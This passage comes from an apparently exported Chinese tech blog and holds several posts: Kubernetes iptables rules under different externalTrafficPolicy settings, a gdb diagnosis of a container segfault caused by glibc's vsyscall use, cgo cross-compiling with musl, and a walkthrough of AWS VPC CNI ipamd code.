iptables-save | grep 30687-A KUBE-NODEPORTS -s 127.0.0.0/8 -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-MARK-MASQ-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM# iptables-save | grep KUBE-XLB-66B67NPFXW65VVJM:KUBE-XLB-66B67NPFXW65VVJM - [0:0]-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -s 10.188.166.0/24 -m comment --comment &quot;Redirect pods trying to reach external loadbalancer VIP to clusterIP&quot; -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;Balancing rule 0 for 2048-game/service-2048-local:&quot; -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;Balancing rule 1 for 2048-game/service-2048-local:&quot; -j KUBE-SEP-UCWOW7PLEZDILT5N# iptables-save | grep KUBE-SEP-TVXZJYL67XY2CHS2:KUBE-SEP-TVXZJYL67XY2CHS2 - [0:0]-A KUBE-SEP-TVXZJYL67XY2CHS2 -s 10.188.166.159/32 -j KUBE-MARK-MASQ-A KUBE-SEP-TVXZJYL67XY2CHS2 -p tcp -m tcp -j DNAT --to-destination 10.188.166.159:80 // here is-A KUBE-SVC-66B67NPFXW65VVJM -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;Balancing rule 0 for 2048-game/service-2048-local:&quot; -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2 可以看到直接 DANT 出去了 没有运行 POD 节点的转发规则当前的 service的externalTrafficPolicy为local 123456789# iptables-save | grep 30687-A KUBE-NODEPORTS -s 127.0.0.0/8 -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-MARK-MASQ-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM# iptables-save | grep KUBE-XLB-66B67NPFXW65VVJM:KUBE-XLB-66B67NPFXW65VVJM - [0:0]-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -s 10.188.166.0/24 -m comment --comment &quot;Redirect pods trying to reach external loadbalancer VIP to clusterIP&quot; -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;2048-game/service-2048-local: has no local endpoints&quot; -j KUBE-MARK-DROP 可以看到DROP的规则，nlb做健康检查都不会通过，流量也就不会到这个没有运行POD的节点上。 简单回顾一下externalTrafficPolicy为Cluster123# iptables-save | grep 30687-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-MARK-MASQ-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-SVC-66B67NPFXW65VVJM 123456# iptables-save | grep KUBE-SVC-66B67NPFXW65VVJM:KUBE-SVC-66B67NPFXW65VVJM - [0:0]-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-SERVICES -d 192.168.61.194/32 -p tcp -m comment --comment &quot;2048-game/service-2048-local: cluster IP&quot; -m tcp --dport 80 -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-SVC-66B67NPFXW65VVJM -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2-A KUBE-SVC-66B67NPFXW65VVJM -j KUBE-SEP-UCWOW7PLEZDILT5N 12345# iptables-save | grep KUBE-SEP-TVXZJYL67XY2CHS2:KUBE-SEP-TVXZJYL67XY2CHS2 - [0:0]-A KUBE-SEP-TVXZJYL67XY2CHS2 -s 10.188.166.159/32 -j KUBE-MARK-MASQ-A KUBE-SEP-TVXZJYL67XY2CHS2 -p tcp -m tcp -j DNAT --to-destination 10.188.166.159:80-A KUBE-SVC-66B67NPFXW65VVJM -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2 12-A KUBE-SEP-TVXZJYL67XY2CHS2 -p tcp -m tcp -j DNAT --to-destination 10.188.166.159:80-A KUBE-SEP-UCWOW7PLEZDILT5N -s 10.188.166.186/32 -j KUBE-MARK-MASQ 可以看到最一个是做IP地址的伪装，自动选择合适的地址做原地址转换。","tags":["k8s"]},{"title":"容器中 glibc 兼容问题","path":"/2020/05/11/glibc/","content":"今天同事在线上做Debain版本升级遇到问题 123456# kubectl exec -it fqh-realserver-01-69586d7c74-dd9cl bashcommand terminated with exit code 139# apt-get updateE: Method http has died unexpectedly!E: Sub-process http received a segmentation fault. 可以看到错误代码是 139 是客户端报错，再看一下内核日志 123May 11 16:11:20 xxx kernel: [5790773.000196] bash[231251] vsyscall attempted with vsyscall=none ip:ffffffffff600400 cs:33 sp:7ffc7942aad8 ax:ffffffffff600400 si:7ffc7942af76 di:0May 11 16:11:20 xxx kernel: [5790773.000200] bash[231251]: segfault at ffffffffff600400 ip ffffffffff600400 sp 00007ffc7942aad8 error 15May 11 16:11:20 xxx kernel: [5790773.000202] Code: Bad RIP value. 问题分析错误信息就怀疑是 ABI 层面的兼容问题，要验证想法就要看一下为什么发生 segmentation fault。 构造一下测试环境，在一个终端启动一个 docker，因为 docker 是 c&#x2F;s 模型，没有必要在客户端 debug，客户端仅仅是个发请求的工具。 12# /usr/bin/docker run -it dockerhub.nie.netease.com/frosty/sea sh# 因为我发现镜像里面的 sh 是可以启动，通过 sh 先将 container 运行起来，任何再 container 运行其他指令。 可以可看到 container，获取这个 container 的 PID，也就是宿主层面的视角的 container 实体。 123456789# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES899eea8d3958 dockerhub.nie.netease.com/frosty/sea &quot;sh&quot; 4 seconds ago Up 3 seconds happy_galileo307eb53d45df e15788915c71 &quot;/usr/bin/cadvisor -…&quot; 7 weeks ago Up 7 weeks k8s_cadvisor_kube-cadvisor-d429r_kube-system_5b88b786-1ecc-4c63-9c10-2b4d5000d3bc_0076136a16137 dockerhub.nie.netease.com/whale/google_containers &quot;/pause&quot; 7 weeks ago Up 7 weeks k8s_POD_kube-cadvisor-d429r_kube-system_5b88b786-1ecc-4c63-9c10-2b4d5000d3bc_0# docker inspect 899eea8d3958 | grep Pid &quot;Pid&quot;: 2204330, &quot;PidMode&quot;: &quot;&quot;, &quot;PidsLimit&quot;: 0, gdb attach 进程，附加上去并继续运行 container（这个 gdb 我安装了 peda 插件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# gdb -q attach 2204330attach: No such file or directory.Attaching to process 2204330Reading symbols from target:/bin/dash...(no debugging symbols found)...done.Reading symbols from target:/lib/x86_64-linux-gnu/libc.so.6...(no debugging symbols found)...done.Reading symbols from target:/lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.warning: Target and debugger are in different PID namespaces; thread lists and other data are likely unreliable. Connect to gdbserver inside the container.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00RBX: 0x0RCX: 0x7f5da5a917d0 --&gt; 0x3173fffff0013d48RDX: 0x2000 (&#x27;&#x27;)RSI: 0x61a200 --&gt; 0x0RDI: 0x0RBP: 0x61a200 --&gt; 0x0RSP: 0x7ffdc70f6608 --&gt; 0x40881d (cmp eax,0x0)RIP: 0x7f5da5a917d0 --&gt; 0x3173fffff0013d48R8 : 0x7f5da5d48e40 --&gt; 0x100000000R9 : 0x7f5da5d48e90 --&gt; 0x0R10: 0x0R11: 0x246R12: 0x0R13: 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x7f5da5a917c7 &lt;read+7&gt;:\tjne 0x7f5da5a917d9 &lt;read+25&gt; 0x7f5da5a917c9 &lt;read+9&gt;:\tmov eax,0x0 0x7f5da5a917ce &lt;read+14&gt;:\tsyscall=&gt; 0x7f5da5a917d0 &lt;read+16&gt;:\tcmp rax,0xfffffffffffff001 0x7f5da5a917d6 &lt;read+22&gt;:\tjae 0x7f5da5a91809 &lt;read+73&gt; 0x7f5da5a917d8 &lt;read+24&gt;:\tret 0x7f5da5a917d9 &lt;read+25&gt;:\tsub rsp,0x8 0x7f5da5a917dd &lt;read+29&gt;:\tcall 0x7f5da5aaa240[------------------------------------stack-------------------------------------]0000| 0x7ffdc70f6608 --&gt; 0x40881d (cmp eax,0x0)0008| 0x7ffdc70f6610 --&gt; 0x10016| 0x7ffdc70f6618 --&gt; 0x00024| 0x7ffdc70f6620 --&gt; 0x00032| 0x7ffdc70f6628 --&gt; 0x40e9cd (mov ebx,eax)0040| 0x7ffdc70f6630 --&gt; 0x10048| 0x7ffdc70f6638 --&gt; 0x40ca67 (test ebp,ebp)0056| 0x7ffdc70f6640 --&gt; 0x1[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x00007f5da5a917d0 in read () from target:/lib/x86_64-linux-gnu/libc.so.6 切换到容器里面执行 ldd （理论上任何非静态打包的程序都可以 12# /usr/bin/docker run -it dockerhub.nie.netease.com/frosty/sea sh# ldd 发现进程收到 SIGSEGV信号，而这个信号的默认行为就是终止进程。 12345678910111213141516171819202122232425262728293031323334[----------------------------------registers-----------------------------------]RAX: 0xffffffffff600400RBX: 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)RCX: 0x7361622f6e69622f (&#x27;/bin/bas&#x27;)RDX: 0x2f (&#x27;/&#x27;)RSI: 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)RDI: 0x0RBP: 0x0RSP: 0x7ffd0d88baf8 --&gt; 0x7f6be2ca160d --&gt; 0x909090c308c48348RIP: 0xffffffffff600400R8 : 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)R9 : 0x1R10: 0x0R11: 0x7f6be2ca1600 --&gt; 0xc0c74808ec8348R12: 0x42164c (&lt;_start&gt;:\txor ebp,ebp)R13: 0x7ffd0d88bd40 --&gt; 0x2R14: 0x0R15: 0x0EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0xffffffffff600400[------------------------------------stack-------------------------------------]0000| 0x7ffd0d88baf8 --&gt; 0x7f6be2ca160d --&gt; 0x909090c308c483480008| 0x7ffd0d88bb00 --&gt; 0x6d (&#x27;m&#x27;)0016| 0x7ffd0d88bb08 --&gt; 0x420324 (&lt;main+1028&gt;:\tmov edx,DWORD PTR [rsp+0x28])0024| 0x7ffd0d88bb10 --&gt; 0x7ffd0d88bc80 --&gt; 0x2000000000032| 0x7ffd0d88bb18 --&gt; 0x7ffd0d88bd48 --&gt; 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)0040| 0x7ffd0d88bb20 --&gt; 0x7ffd0d88bd60 --&gt; 0x7ffd0d88cf77 (&quot;HOSTNAME=899eea8d3958&quot;)0048| 0x7ffd0d88bb28 --&gt; 0x7f6b000000020056| 0x7ffd0d88bb30 --&gt; 0xf63d4e2e[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0xffffffffff600400 in ?? () 发现 RIP 寄存器访问了内核的地址空间了，内核所在高地址。任何系统就给发了一个 SIGSEGV 信号，默认行为就是终止进程。 123456gdb-peda$ bt#0 0xffffffffff600400 in ?? ()#1 0x00007f828873f60d in time () from target:/lib/x86_64-linux-gnu/libc.so.6#2 0x0000000000420324 in main ()#3 0x00007f82886c0ead in __libc_start_main () from target:/lib/x86_64-linux-gnu/libc.so.6#4 0x0000000000421675 in _start () 可以看到其实进程死的时候调用了标准库里面的函数 time() ，标准库的问题在容器中位于 /lib/x86_64-linux-gnu/libc.so.6。 反汇编看一下这个函数的实现 12345678gdb-peda$ disassemble 0x00007fa58acd060dDump of assembler code for function time: 0x00007fa58acd0600 &lt;+0&gt;:\tsub rsp,0x8 0x00007fa58acd0604 &lt;+4&gt;:\tmov rax,0xffffffffff600400 0x00007fa58acd060b &lt;+11&gt;:\tcall rax 0x00007fa58acd060d &lt;+13&gt;:\tadd rsp,0x8 0x00007fa58acd0611 &lt;+17&gt;:\tretEnd of assembler dump. 可以看到 rax 值就是异常的原因，看一下当前进程的 memory layout。可以看到至少没有将 0xffffffffff600400 这个地址映射到进程的地址空间。 1234567891011121314151617181920212223242526272829gdb-peda$ vmmapStart End Perm\tName0x00400000 0x004e5000 r-xp\t/bin/bash0x006e4000 0x006e5000 r--p\t/bin/bash0x006e5000 0x006ee000 rw-p\t/bin/bash0x006ee000 0x006f4000 rw-p\tmapped0x0190e000 0x01910000 rw-p\t[heap]0x00007fa58ac33000 0x00007fa58adb5000 r-xp\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58adb5000 0x00007fa58afb5000 ---p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58afb5000 0x00007fa58afb9000 r--p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58afb9000 0x00007fa58afba000 rw-p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58afba000 0x00007fa58afbf000 rw-p\tmapped0x00007fa58afbf000 0x00007fa58afc1000 r-xp\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58afc1000 0x00007fa58b1c1000 ---p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58b1c1000 0x00007fa58b1c2000 r--p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58b1c2000 0x00007fa58b1c3000 rw-p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58b1c3000 0x00007fa58b1e8000 r-xp\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b1e8000 0x00007fa58b3e7000 ---p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b3e7000 0x00007fa58b3eb000 r--p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b3eb000 0x00007fa58b3ec000 rw-p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b3ec000 0x00007fa58b40c000 r-xp\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007fa58b604000 0x00007fa58b607000 rw-p\tmapped0x00007fa58b609000 0x00007fa58b60b000 rw-p\tmapped0x00007fa58b60b000 0x00007fa58b60c000 r--p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007fa58b60c000 0x00007fa58b60d000 rw-p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007fa58b60d000 0x00007fa58b60e000 rw-p\tmapped0x00007ffca937e000 0x00007ffca939f000 rw-p\t[stack]0x00007ffca93ca000 0x00007ffca93cd000 r--p\t[vvar]0x00007ffca93cd000 0x00007ffca93cf000 r-xp\t[vdso] 确认一下 glibc的版本并将这个动态连接库复制到宿主上，反汇编分析。 123456# ls /lib/x86_64-linux-gnu/libc.so.6/lib/x86_64-linux-gnu/libc.so.6# ls -al /lib/x86_64-linux-gnu/libc.so.6lrwxrwxrwx 1 root root 12 Oct 16 2014 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.13.so# ls /lib/x86_64-linux-gnu/libc-2.13.so/lib/x86_64-linux-gnu/libc-2.13.so 反汇编如下可以看到和运行时的代码是一样的，也就是说这个版本 glibc 代码里面硬编码了 0xffffffffff600400 这个地址。 12345678910# gdb -q libc-2.13.soReading symbols from libc-2.13.so...(no debugging symbols found)...done.gdb-peda$ disassemble timeDump of assembler code for function time: 0x000000000009d600 &lt;+0&gt;:\tsub rsp,0x8 0x000000000009d604 &lt;+4&gt;:\tmov rax,0xffffffffff600400 0x000000000009d60b &lt;+11&gt;:\tcall rax 0x000000000009d60d &lt;+13&gt;:\tadd rsp,0x8 0x000000000009d611 &lt;+17&gt;:\tretEnd of assembler dump. 这也就初步验证了就是应该是 ABI 层面的兼容问题，Google 一下解决方案也是很简单的在 grub 里面配置启动参数 vsyscall=emulate，之所以这样配置的原因是 kernel Config。 修改参数修改一下重新尝试，发现内存里面多了一个 vsyscall 的 4k page。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647gdb-peda$ vmmapStart End Perm\tName0x00400000 0x004e5000 r-xp\t/bin/bash0x006e4000 0x006e5000 r--p\t/bin/bash0x006e5000 0x006ee000 rw-p\t/bin/bash0x006ee000 0x006f4000 rw-p\tmapped0x0134e000 0x0138b000 rw-p\t[heap]0x00007f2d59391000 0x00007f2d5939c000 r-xp\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5939c000 0x00007f2d5959b000 ---p\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5959b000 0x00007f2d5959c000 r--p\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5959c000 0x00007f2d5959d000 rw-p\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5959d000 0x00007f2d595a7000 r-xp\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d595a7000 0x00007f2d597a6000 ---p\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d597a6000 0x00007f2d597a7000 r--p\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d597a7000 0x00007f2d597a8000 rw-p\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d597a8000 0x00007f2d597bd000 r-xp\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d597bd000 0x00007f2d599bc000 ---p\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d599bc000 0x00007f2d599bd000 r--p\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d599bd000 0x00007f2d599be000 rw-p\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d599be000 0x00007f2d599c0000 rw-p\tmapped0x00007f2d599c0000 0x00007f2d599c7000 r-xp\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d599c7000 0x00007f2d59bc6000 ---p\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d59bc6000 0x00007f2d59bc7000 r--p\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d59bc7000 0x00007f2d59bc8000 rw-p\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d59bc8000 0x00007f2d59d4a000 r-xp\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59d4a000 0x00007f2d59f4a000 ---p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59f4a000 0x00007f2d59f4e000 r--p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59f4e000 0x00007f2d59f4f000 rw-p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59f4f000 0x00007f2d59f54000 rw-p\tmapped0x00007f2d59f54000 0x00007f2d59f56000 r-xp\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d59f56000 0x00007f2d5a156000 ---p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d5a156000 0x00007f2d5a157000 r--p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d5a157000 0x00007f2d5a158000 rw-p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d5a158000 0x00007f2d5a17d000 r-xp\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a17d000 0x00007f2d5a37c000 ---p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a37c000 0x00007f2d5a380000 r--p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a380000 0x00007f2d5a381000 rw-p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a381000 0x00007f2d5a3a1000 r-xp\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007f2d5a599000 0x00007f2d5a59c000 rw-p\tmapped0x00007f2d5a59e000 0x00007f2d5a5a0000 rw-p\tmapped0x00007f2d5a5a0000 0x00007f2d5a5a1000 r--p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007f2d5a5a1000 0x00007f2d5a5a2000 rw-p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007f2d5a5a2000 0x00007f2d5a5a3000 rw-p\tmapped0x00007ffe04499000 0x00007ffe044ba000 rw-p\t[stack]0x00007ffe044d0000 0x00007ffe044d3000 r--p\t[vvar]0x00007ffe044d3000 0x00007ffe044d5000 r-xp\t[vdso]0xffffffffff600000 0xffffffffff601000 r-xp\t[vsyscall] 也就说启用这个特性操作系统会有更好的向下兼容的特性，但是这个操作系统上的每一个进程都会映射一块内核的地址空间。","tags":["go"]},{"title":"cgo 交叉编译","path":"/2020/03/11/cgo-cross-compiler/","content":"日常工作是写 golang，在 mac 上开发代码，通过 GOOS 指定操作系统进行交叉编译发布到 Linux 环境。 但是在这一次的需求中在 golang 的项目中引用了 C 代码，带来的后果就是指定 GOOS 进行交叉编译失败。 C 代码是 inline 的方式引入的，形式如下 1234567891011121314package testimport (\t&quot;fmt&quot;\t&quot;unsafe&quot;)//#include &lt;stdio.h&gt;//#include &lt;stdint.h&gt;//#include &lt;math.h&gt;//#include &lt;string.h&gt;//#include &lt;stdlib.h&gt;... some codeimport &quot;C&quot; 正确的进行含 cgo 代码的交叉编译需要 2 步，首先安装 mac 下 Linux 平台交叉编译工具链 brew install FiloSottile/musl-cross/musl-cross，需要相当一段时间才能安装好。 其次指定 makefile 或者 其他形式的编译参数 CC=&quot;x86_64-linux-musl-gcc&quot;, 与 CGO_LDFLAGS=&quot;-static&quot;。 makefile 是我工作的正常编译管理工具，修改如下。 12345678go-build:\tCGO_ENABLED=1 \\\tGO111MODULE=off \\\tGOOS=&quot;linux&quot; \\\tGOARCH=&quot;amd64&quot; \\\tCC=&quot;x86_64-linux-musl-gcc&quot; \\\tCGO_LDFLAGS=&quot;-static&quot; \\\tgo build -a -v -ldflags $(LDFLAGS) main.go","tags":["go"]},{"title":"amzon aws cni 踩坑 2","path":"/2019/11/25/amazon-vpc-cni-delete-eni/","content":"目前业务上准备试用 aws vpc cni 方案，之前遇到了一些 cni 的使用问题发现还有一些细节不了解。 遂去尝试使用它提供的一些特性开关，在试用 AWS_VPC_K8S_CNI_EXTERNALSNAT 开关，重建了 aws node ds, 发现 ec2 节点的 网卡被 deattach 了，继而导致了使用了绑定在这个网卡上的浮动 ip 的 pod 失联了。 结论：是 ipamd deattach 了 eni, 是 ipamd delete 了 eni. ipamd 这也的逻辑很奇怪，看代码没有发现明显逻辑问题。 代码分析下面就是 ipamd 的起手代码，无关逻辑直接删除了方便梳理核心。 123456789101112131415func _main() int &#123;...\tdiscoverController := k8sapi.NewController(kubeClient)\tgo discoverController.DiscoverK8SPods()\teniConfigController := eniconfig.NewENIConfigController()...\tipamContext, err := ipamd.New(discoverController, eniConfigController)\tif err != nil &#123; log.Errorf(&quot;Initialization failure: %v&quot;, err) return 1\t&#125;\t...&#125; 上述代码和重逻辑，核心在 ipamd.New 的实现中，下面就看一下这个 function 的实现 123456789// New retrieves IP address usage information from Instance MetaData service and Kubelet// then initializes IP address pool data storefunc New(k8sapiClient k8sapi.K8SAPIs, eniConfig *eniconfig.ENIConfigController) (*IPAMContext, error) &#123;...\tc.warmENITarget = getWarmENITarget()\tc.warmIPTarget = getWarmIPTarget()\terr = c.nodeInit()... 上述代码就是函数核心，看一下官方的的设计提议里面L-IPAM can immediately take one available secondary IP address from its warm pool and assign it to Pod., 那两行代码就是准备去满足这个设计需求的。 其实后面 nodeInit 才是这一串代码中的关键点。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//TODO need to break this function down(comments from CR)func (c *IPAMContext) nodeInit() error &#123;...\tc.maxENI, err = c.getMaxENI()\tif err != nil &#123; log.Error(&quot;Failed to get ENI limit&quot;) return err\t&#125;\tenisMax.Set(float64(c.maxENI))\tc.maxIPsPerENI, err = c.awsClient.GetENIipLimit()\tif err != nil &#123; log.Error(&quot;Failed to get IPs per ENI limit&quot;) return err\t&#125;\tipMax.Set(float64(c.maxIPsPerENI * c.maxENI)) // 因为 ec2 不同机型可以添加 eni 以及每个 eni 上附加的 ip 数量不一致。\tc.useCustomNetworking = UseCustomNetworkCfg()\tc.primaryIP = make(map[string]string)\tc.reconcileCooldownCache.cache = make(map[string]time.Time)\tenis, err := c.awsClient.GetAttachedENIs()\tif err != nil &#123; log.Error(&quot;Failed to retrieve ENI info&quot;) return errors.New(&quot;ipamd init: failed to retrieve attached ENIs info&quot;)\t&#125;\t_, vpcCIDR, err := net.ParseCIDR(c.awsClient.GetVPCIPv4CIDR())\tif err != nil &#123; log.Error(&quot;Failed to parse VPC IPv4 CIDR&quot;, err.Error()) return errors.Wrap(err, &quot;ipamd init: failed to retrieve VPC CIDR&quot;)\t&#125;\tprimaryIP := net.ParseIP(c.awsClient.GetLocalIPv4())\terr = c.networkClient.SetupHostNetwork(vpcCIDR, c.awsClient.GetVPCIPv4CIDRs(), c.awsClient.GetPrimaryENImac(), &amp;primaryIP)\tif err != nil &#123; log.Error(&quot;Failed to set up host network&quot;, err) return errors.Wrap(err, &quot;ipamd init: failed to set up host network&quot;)\t&#125;\tc.dataStore = datastore.NewDataStore() // 这里就是创建那个本地 ip 池的数据结构了\tfor _, eni := range enis &#123; log.Debugf(&quot;Discovered ENI %s, trying to set it up&quot;, eni.ENIID) // Retry ENI sync retry := 0 for &#123; retry++ err = c.setupENI(eni.ENIID, eni) // 这个函数只要干三件事情 // 1 把 eni 添加到 datastore 中。 // 2 把 设置 Linux eni 相关， // 3 将 eni 的浮动 ip 放置到 datastore 中 // 虽然都是与本次问题没有关系的。 if retry &gt; maxRetryCheckENI &#123; log.Errorf(&quot;Unable to discover attached IPs for ENI from metadata service&quot;) ipamdErrInc(&quot;waitENIAttachedMaxRetryExceeded&quot;) break &#125;... break &#125;\t&#125;\tusedIPs, err := c.getLocalPodsWithRetry()\tlog.Debugf(&quot;getLocalPodsWithRetry() found %d used IPs.&quot;, len(usedIPs))\t// 上面 function 重建本地 pod 信息，包括 name/namespace/ip/containerid if err != nil &#123; log.Warnf(&quot;During ipamd init, failed to get Pod information from kubelet %v&quot;, err) ipamdErrInc(&quot;nodeInitK8SGetLocalPodIPsFailed&quot;) // This can happens when L-IPAMD starts before kubelet. // TODO need to add node health stats here return errors.Wrap(err, &quot;failed to get running pods!&quot;)\t&#125;\trules, err := c.networkClient.GetRuleList()\tif err != nil &#123; log.Errorf(&quot;During ipamd init: failed to retrieve IP rule list %v&quot;, err) return nil\t&#125;\tfor _, ip := range usedIPs &#123; if ip.Container == &quot;&quot; &#123; log.Infof(&quot;Skipping Pod %s, Namespace %s, due to no matching container&quot;, ip.Name, ip.Namespace) continue &#125; if ip.IP == &quot;&quot; &#123; log.Infof(&quot;Skipping Pod %s, Namespace %s, due to no IP&quot;, ip.Name, ip.Namespace) continue &#125; log.Infof(&quot;Recovered AddNetwork for Pod %s, Namespace %s, Container %s&quot;, ip.Name, ip.Namespace, ip.Container) _, _, err = c.dataStore.AssignPodIPv4Address(ip) if err != nil &#123; ipamdErrInc(&quot;nodeInitAssignPodIPv4AddressFailed&quot;) log.Warnf(&quot;During ipamd init, failed to use pod IP %s returned from Kubelet %v&quot;, ip.IP, err) // TODO continue, but need to add node health stats here // TODO need to feed this to controller on the health of pod and node // This is a bug among kubelet/cni-plugin/l-ipamd/ec2-metadata that this particular pod is using an non existent ip address. // Here we choose to continue instead of returning error and EXIT out L-IPAMD(exit L-IPAMD will make whole node out) // The plan(TODO) is to feed this info back to controller and let controller cleanup this pod from this node. &#125; // Update ip rules in case there is a change in VPC CIDRs, AWS_VPC_K8S_CNI_EXTERNALSNAT setting srcIPNet := net.IPNet&#123;IP: net.ParseIP(ip.IP), Mask: net.IPv4Mask(255, 255, 255, 255)&#125; vpcCIDRs := c.awsClient.GetVPCIPv4CIDRs() var pbVPCcidrs []string for _, cidr := range vpcCIDRs &#123; pbVPCcidrs = append(pbVPCcidrs, *cidr) &#125; err = c.networkClient.UpdateRuleListBySrc(rules, srcIPNet, pbVPCcidrs, !c.networkClient.UseExternalSNAT()) if err != nil &#123; log.Errorf(&quot;UpdateRuleListBySrc in nodeInit() failed for IP %s: %v&quot;, ip.IP, err) &#125;\t&#125;\treturn nil&#125; 稍微小结一下，上面是初始化流程，每一次启动的时候 ipamd 会在本地建一个地址池，并通过本地一个 dataStore来标记地址池的分配状态。 具体的下方规则在我们这个问题里面并不关心，是因为我遇到的不是iptables的转发问题。 看一下每次重启重新标记分配出去的 ip 的逻辑，其实核心逻辑就是 assignPodIPv4AddressUnsafe 中在内存中重建分配数据。 12345678910111213141516171819202122232425262728// AssignPodIPv4Address assigns an IPv4 address to pod// It returns the assigned IPv4 address, device number, errorfunc (ds *DataStore) AssignPodIPv4Address(k8sPod *k8sapi.K8SPodInfo) (string, int, error) &#123;\tds.lock.Lock()\tdefer ds.lock.Unlock()\tlog.Debugf(&quot;AssignIPv4Address: IP address pool stats: total: %d, assigned %d&quot;, ds.total, ds.assigned)\tpodKey := PodKey&#123; name: k8sPod.Name, namespace: 